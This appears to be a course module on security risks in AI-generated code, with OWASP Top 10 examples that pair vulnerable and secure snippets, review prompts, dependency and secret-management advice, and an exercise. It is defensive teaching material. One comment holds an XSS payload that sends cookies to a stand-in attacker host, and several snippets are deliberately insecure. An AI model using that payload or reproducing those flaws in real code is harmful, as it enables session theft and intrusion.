# Secure Code Generation

## Learning Objectives

By the end of this module, you will be able to:

- Identify the unique security risks introduced by AI-generated code
- Recognize OWASP Top 10 vulnerabilities in the context of AI code generation
- Detect common security anti-patterns that AI tools produce
- Use AI tools proactively for security review and hardening
- Write security-aware prompts that produce safer code by default
- Verify AI-suggested dependencies for known vulnerabilities
- Prevent accidental exposure of secrets through AI interactions
- Apply a security review checklist to all AI-generated code

---

## Security Risks in AI-Generated Code

AI code generation introduces a category of security risk that did not exist before: **automated production of vulnerable code at scale.** A developer copying a vulnerable pattern from Stack Overflow affects one file. An AI generating vulnerable patterns across an entire codebase affects dozens of files in minutes.

### Why AI Produces Insecure Code

1. **Training data includes vulnerable code.** The AI learned from millions of repositories, many containing security flaws. The model does not distinguish between secure and insecure patterns -- it predicts what is *common*, not what is *safe*.

2. **Optimization for functionality, not security.** AI tools are optimized to produce code that *works*, not code that is *secure*. A function that fetches user data without authorization checks is functionally correct -- it just should not exist.

3. **Lack of threat awareness.** The AI does not know your threat model. It does not know which data is sensitive, which endpoints are public-facing, or what compliance requirements apply.

4. **Deprecated security practices.** The training data may include older security patterns that were once considered best practice but are now known to be insufficient (e.g., MD5 for hashing, JWT without expiration).

5. **Context blindness.** The AI generates code in isolation. It does not consider that the input to this function might come from an untrusted user, or that this database query might be exposed to SQL injection through a chain of calls.

---

## OWASP Top 10 in the Context of AI Code Generation

The [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/) is the standard awareness document for web application security. Here is how each vulnerability manifests in AI-generated code.

### A01: Broken Access Control

AI frequently generates endpoints without authorization checks.

```typescript
// AI-generated: Missing authorization -- any authenticated user can access any user's data
router.get('/api/users/:id', authenticate, async (req, res) => {
  const user = await db.user.findUnique({ where: { id: req.params.id } });
  res.json(user);
});

// Secure version: Verify the requesting user can access this data
router.get('/api/users/:id', authenticate, async (req, res) => {
  // Only allow users to access their own data, or admins to access any
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    throw new ForbiddenError('You can only access your own profile');
  }
  const user = await db.user.findUnique({ where: { id: req.params.id } });
  res.json(user);
});
```

**What to look for in review:** Every data access endpoint must have authorization logic. Ask: "Can User A access User B's data through this endpoint?"

### A02: Cryptographic Failures

AI may suggest weak or outdated cryptographic methods.

```python
# AI-generated: MD5 is cryptographically broken
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# Secure version: Use bcrypt or argon2 for password hashing
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

```typescript
// AI-generated: Weak JWT configuration
const token = jwt.sign({ userId: user.id }, 'secret-key');

// Secure version: Strong secret, expiration, and algorithm specification
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,  // Strong, environment-specific secret
  {
    algorithm: 'HS256',
    expiresIn: '15m',      // Short expiration
    issuer: 'my-app',
    audience: 'my-app-api',
  }
);
```

**What to look for:** Hardcoded secrets, MD5/SHA1 for passwords, missing token expiration, weak algorithms.

### A03: Injection

The most classic vulnerability. AI frequently generates injection-vulnerable code.

```javascript
// AI-generated: SQL injection vulnerability
const query = `SELECT * FROM users WHERE email = '${email}' AND role = '${role}'`;
const result = await db.query(query);

// Secure version: Parameterized query
const query = 'SELECT * FROM users WHERE email = $1 AND role = $2';
const result = await db.query(query, [email, role]);
```

```javascript
// AI-generated: Command injection
const { exec } = require('child_process');
exec(`convert ${inputFile} ${outputFile}`, callback);

// Secure version: Use array-based arguments, never string interpolation
const { execFile } = require('child_process');
execFile('convert', [inputFile, outputFile], callback);
```

**What to look for:** String concatenation or template literals in SQL, shell commands, LDAP queries, or XML processing.

### A04: Insecure Design

AI generates code that works but is architecturally insecure.

```typescript
// AI-generated: Password reset with predictable token
function generateResetToken(userId: string): string {
  return Buffer.from(`${userId}-${Date.now()}`).toString('base64');
  // Predictable! Attacker can guess tokens for other users
}

// Secure version: Cryptographically random token
import crypto from 'crypto';
function generateResetToken(): string {
  return crypto.randomBytes(32).toString('hex');
}
```

### A05: Security Misconfiguration

AI often generates permissive CORS, verbose error responses, or debug-enabled configurations.

```typescript
// AI-generated: Overly permissive CORS
app.use(cors({ origin: '*' }));

// Secure version: Whitelist specific origins
app.use(cors({
  origin: ['https://myapp.com', 'https://staging.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,
}));
```

```typescript
// AI-generated: Leaks stack traces to clients
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,  // NEVER send stack traces to clients
  });
});

// Secure version: Generic error for clients, detailed logging for operators
app.use((err, req, res, next) => {
  logger.error('Unhandled error', { error: err.message, stack: err.stack, requestId: req.id });
  res.status(500).json({
    error: 'An internal error occurred',
    requestId: req.id,  // For support reference
  });
});
```

### A06: Vulnerable and Outdated Components

AI may suggest packages with known vulnerabilities or outdated versions.

```bash
# AI suggests a package -- but is it safe?
npm install serialize-javascript@2.1.0
# This version has a known XSS vulnerability (CVE-2020-7660)

# Always check:
npm audit
# Or verify before installing:
npm info serialize-javascript versions
```

### A07: Identification and Authentication Failures

```typescript
// AI-generated: No rate limiting on login
router.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.user.findUnique({ where: { email } });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  // No rate limiting -- vulnerable to brute force attacks
});

// Secure version: Rate limiting + account lockout
router.post('/api/login',
  rateLimiter({ windowMs: 15 * 60 * 1000, max: 5 }),  // 5 attempts per 15 min
  async (req, res) => {
    const { email, password } = req.body;
    const user = await db.user.findUnique({ where: { email } });

    if (user?.lockoutUntil && user.lockoutUntil > new Date()) {
      return res.status(423).json({ error: 'Account temporarily locked' });
    }

    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
      if (user) await incrementFailedAttempts(user.id);
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    await resetFailedAttempts(user.id);
    // ... generate token
  }
);
```

### A08-A10: Additional Concerns

| Vulnerability | AI Pattern | Secure Alternative |
|--------------|------------|-------------------|
| **A08: Software/Data Integrity** | No integrity checks on updates, unsigned webhooks | Verify webhook signatures, use SRI for CDN assets |
| **A09: Logging Failures** | Missing audit logs, logging sensitive data | Structured logging with PII filtering |
| **A10: SSRF** | Fetching user-provided URLs without validation | URL allowlisting, DNS rebinding protection |

---

## Common Security Anti-Patterns AI Produces

### Anti-Pattern 1: Hardcoded Secrets

```typescript
// AI frequently embeds example credentials that make it to production
const stripe = new Stripe('sk_test_EXAMPLE_KEY_DO_NOT_USE');
const dbUrl = 'postgresql://admin:password123@localhost:5432/mydb';
const jwtSecret = 'my-super-secret-key-that-should-be-in-env';
```

**Fix:** Use environment variables and validate they exist at startup.

```typescript
const stripe = new Stripe(requireEnv('STRIPE_SECRET_KEY'));
const dbUrl = requireEnv('DATABASE_URL');
const jwtSecret = requireEnv('JWT_SECRET');

function requireEnv(name: string): string {
  const value = process.env[name];
  if (!value) throw new Error(`Missing required environment variable: ${name}`);
  return value;
}
```

### Anti-Pattern 2: Insufficient Input Validation

```typescript
// AI generates the happy path but skips validation
router.post('/api/transfer', async (req, res) => {
  const { fromAccount, toAccount, amount } = req.body;
  await transferService.transfer(fromAccount, toAccount, amount);
  res.json({ success: true });
});

// What if amount is negative? (reverse transfer)
// What if amount is a string? (type confusion)
// What if fromAccount === toAccount? (self-transfer)
// What if amount has more than 2 decimal places? (fractional penny attack)
```

**Fix:** Always validate and sanitize input.

```typescript
const transferSchema = z.object({
  fromAccount: z.string().uuid(),
  toAccount: z.string().uuid(),
  amount: z.number()
    .positive('Amount must be positive')
    .multipleOf(0.01, 'Amount must have at most 2 decimal places')
    .max(1_000_000, 'Amount exceeds maximum transfer limit'),
}).refine(
  data => data.fromAccount !== data.toAccount,
  'Cannot transfer to the same account'
);
```

### Anti-Pattern 3: Missing Output Encoding

```typescript
// AI-generated: XSS vulnerability in server-rendered HTML
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
  // If query is: <script>document.location='https://evil.com?c='+document.cookie</script>
  // The script executes in the user's browser
});
```

### Anti-Pattern 4: Verbose Error Messages

```python
# AI-generated: Leaks database schema to attackers
@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({
        "error": str(e),
        "type": type(e).__name__,
        "traceback": traceback.format_exc()  # Full stack trace exposed
    }), 500
```

---

## Using AI for Security Review

AI tools can be powerful allies for finding security issues -- if you prompt them correctly.

### Security Scan with Claude Code

```
> Perform a security review of the authentication module
  in src/auth/. Specifically check for:
>
> 1. OWASP Top 10 vulnerabilities
> 2. Hardcoded secrets or credentials
> 3. Missing input validation
> 4. Insufficient authorization checks
> 5. Weak cryptographic usage
> 6. Information leakage in error responses
> 7. Missing rate limiting on sensitive endpoints
> 8. Insecure session management
>
> For each finding, provide:
> - Severity (Critical/High/Medium/Low)
> - File and line number
> - Description of the vulnerability
> - Exploitation scenario
> - Recommended fix with code example
```

### Automated Security Prompt Template

```markdown
<!-- .claude/commands/security-review.md -->
Perform a security review of $ARGUMENTS.

Check for these categories:
1. Injection vulnerabilities (SQL, NoSQL, command, LDAP)
2. Authentication and session management flaws
3. Access control issues (missing authorization checks)
4. Cryptographic weaknesses
5. Input validation gaps
6. Error handling that leaks information
7. Hardcoded secrets or sensitive data
8. Insecure dependencies
9. CORS and CSP configuration issues
10. Rate limiting and DoS protection

For each finding, format as:

### [SEVERITY] [Category]: [Brief Description]
**File:** [path:line]
**Risk:** [What an attacker could do]
**Fix:**
```code
[Corrected code]
```​

Prioritize findings by severity and exploitability.
```

---

## Secure-by-Default Prompting

The most effective prevention is writing prompts that produce secure code from the start.

### Include Security Requirements in Every Prompt

```
> Implement the password reset endpoint.
>
> Security requirements:
> - Rate limit: 3 reset requests per email per hour
> - Token: cryptographically random, 32 bytes, hex encoded
> - Token expiration: 1 hour
> - Token is single-use (invalidated after use)
> - Do not confirm whether an email exists (prevents enumeration)
> - Log all reset attempts with IP address (but not the token)
> - Use constant-time comparison for token verification
> - Reset tokens stored as bcrypt hash (not plaintext) in database
```

### Use a Security Preamble

Add to your CLAUDE.md:

```markdown
## Security Standards (Apply to ALL Generated Code)

1. Never hardcode secrets, API keys, or credentials
2. All user input must be validated using Zod schemas
3. All database queries must use parameterized queries
4. All endpoints must have appropriate authorization checks
5. Error responses must not leak stack traces or internal details
6. Sensitive operations must have rate limiting
7. All passwords must be hashed with bcrypt (cost factor 12)
8. JWT tokens must have expiration (15 min access, 7 day refresh)
9. CORS must whitelist specific origins (never use *)
10. All logging must filter PII (email, IP, names)
```

### Security-Focused Prompt Pattern

```
> Implement [feature].
>
> Before writing any code, list the potential security risks
> for this feature and how you will mitigate each one.
> Then implement with those mitigations built in.
```

This forces the AI to think about security before coding, often producing significantly safer output.

---

## Dependency Security

### Checking AI-Suggested Packages

When AI suggests installing a package, verify before installing:

```bash
# 1. Check if the package exists and is legitimate
npm info <package-name>

# 2. Check download counts (low counts may indicate typosquatting)
npm info <package-name> --json | jq '.dist-tags, .time.created'

# 3. Check for known vulnerabilities
npm audit --json

# 4. Check for vulnerabilities with Snyk (optional)
npx snyk test

# 5. Review the package's GitHub repository
# - How many stars/contributors?
# - When was it last updated?
# - Are there open security issues?
```

### Typosquatting Risk

AI models may suggest slightly misspelled package names that could be typosquatting attacks:

```bash
# Real packages vs potential typosquats:
express          # Real
expres           # Typosquat potential
expresss         # Typosquat potential

lodash           # Real
lodahs           # Typosquat potential

# Always verify the exact package name on npmjs.com
```

### Lock File Hygiene

```bash
# After AI suggests new dependencies, verify the lock file
npm install
npm audit

# Review what was actually installed
npm ls --depth=0

# Check for supply chain issues
npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm
```

---

## Secret Management

### Preventing AI from Exposing Secrets

**Rule 1: Never paste secrets into AI prompts.**

```
# BAD: Pasting your .env file into a prompt
> Here is my .env file:
  DATABASE_URL=postgresql://admin:realpassword@prod-db.example.com:5432/mydb
  STRIPE_KEY=sk_live_EXAMPLE_DO_NOT_USE
  JWT_SECRET=production-secret-key

# GOOD: Reference the structure without values
> My .env file has these variables: DATABASE_URL, STRIPE_KEY, JWT_SECRET
  Help me add a new variable for the Redis connection URL.
```

**Rule 2: Add secrets patterns to .gitignore AND CLAUDE.md.**

```markdown
<!-- In CLAUDE.md -->
## Secrets Policy
- NEVER read or display the contents of .env, .env.*, or any file
  matching *.key, *.pem, *.cert
- NEVER include real secrets, API keys, or passwords in generated code
- Always use process.env for secret access
- Always use requireEnv() helper to validate secrets at startup
```

**Rule 3: Scan for accidentally committed secrets.**

```bash
# Use git-secrets, trufflehog, or gitleaks to scan for leaked secrets
npx trufflehog filesystem --directory . --only-verified
# or: gitleaks detect --source .
```

---

## Security Checklist for AI-Generated Code

Use this checklist for every PR containing AI-generated code:

```markdown
## Security Review Checklist

### Input Handling
- [ ] All user input is validated (type, format, range, length)
- [ ] Input validation uses allowlists, not blocklists
- [ ] File uploads are validated (type, size, content)
- [ ] URL parameters are validated and sanitized

### Authentication & Authorization
- [ ] Every endpoint has appropriate auth middleware
- [ ] Authorization checks verify the user can perform THIS action on THIS resource
- [ ] Password handling uses bcrypt/argon2 with appropriate cost factor
- [ ] Session/token management follows security best practices

### Data Protection
- [ ] No secrets or credentials in source code
- [ ] Sensitive data is not logged
- [ ] Error messages do not leak internal details
- [ ] PII is handled according to privacy requirements
- [ ] Database queries use parameterized statements

### Configuration
- [ ] CORS is configured with specific allowed origins
- [ ] Security headers are set (CSP, HSTS, X-Frame-Options, etc.)
- [ ] Debug mode is disabled in production configuration
- [ ] Rate limiting is applied to sensitive endpoints

### Dependencies
- [ ] All new dependencies have been audited (npm audit)
- [ ] Package names are verified (no typosquatting)
- [ ] Dependencies have active maintenance and reasonable download counts
- [ ] No dependencies with known critical vulnerabilities

### Cryptography
- [ ] No weak algorithms (MD5, SHA1 for security purposes)
- [ ] Tokens are cryptographically random
- [ ] Keys are of appropriate length
- [ ] No custom cryptography implementations
```

---

## Exercise

### Security Vulnerability Hunt

**Goal:** Generate code with an AI tool, then systematically find and fix security vulnerabilities in it.

**Part 1: Generate Vulnerable Code (intentionally)**

Ask your AI tool to quickly generate a user management API WITHOUT mentioning security. Use a prompt like:

```
Create a simple Express API with these endpoints:
- POST /api/register (email, password, name)
- POST /api/login (email, password) -> returns token
- GET /api/users/:id -> returns user profile
- PUT /api/users/:id -> updates user profile
- DELETE /api/users/:id -> deletes user
- POST /api/forgot-password (email) -> sends reset email
- POST /api/reset-password (token, newPassword) -> resets password

Use Express, a simple in-memory store, and JWT for auth.
Make it work quickly, do not worry about production readiness.
```

**Part 2: Security Audit (20 minutes)**

Using the Security Checklist above, audit every endpoint. Document each finding:

1. **Vulnerability type** (OWASP category)
2. **Location** (file, line)
3. **Severity** (Critical/High/Medium/Low)
4. **Exploitation scenario** (how an attacker would exploit it)
5. **Fix** (what the code should be)

**Target: Find at least 10 vulnerabilities.** Common ones to look for:
- Missing authorization on profile endpoints
- No rate limiting on login/forgot-password
- Weak password requirements
- Token not expiring
- Hardcoded JWT secret
- No input validation
- SQL injection or NoSQL injection potential
- Information leakage in error responses
- Missing CORS configuration
- Password stored in plaintext or weak hash

**Part 3: Fix with Security-Aware Prompts (20 minutes)**

Now ask the AI to fix the code, but this time provide explicit security requirements:

```
Review the code you generated and fix ALL security vulnerabilities.
Apply these security requirements:
[paste the relevant items from the Security Standards in CLAUDE.md]
```

**Part 4: Compare**

- How many vulnerabilities were in the original AI output?
- How many did the AI fix when given security requirements?
- Were there any vulnerabilities the AI missed even with explicit security prompting?
- What does this tell you about the importance of security-aware prompting?

**Bonus:** Use Claude Code's security review capability to audit the fixed code:

```
> Perform a thorough security review of the user management API.
  Check for OWASP Top 10 vulnerabilities and any remaining security gaps.
```

Compare the AI's findings with your manual audit. Did it catch everything you found? Did it find things you missed?
